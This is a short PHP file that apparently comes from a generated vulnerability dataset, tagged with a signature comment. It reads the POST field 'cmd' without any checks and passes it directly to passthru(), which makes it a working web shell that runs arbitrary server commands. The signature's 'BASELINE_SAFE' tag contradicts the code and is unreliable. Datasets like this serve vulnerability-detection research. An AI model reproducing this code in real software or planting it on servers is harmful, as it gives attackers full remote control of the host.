<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=POST_LOCAL_COPY_ISSET; SKELETON=S1; KEY=cmd; SINK=B4; VAR=v0131 */
function SINK_B4($command){
    passthru($command);
}
$p = $_POST;
$inp = isset($p["cmd"]) ? (string)$p["cmd"] : "";
$inp = (string)$inp; // no value processing
function run_sink($x){
    return SINK_B4($x);
}
$out = run_sink($inp);
echo (string)($out);
?>
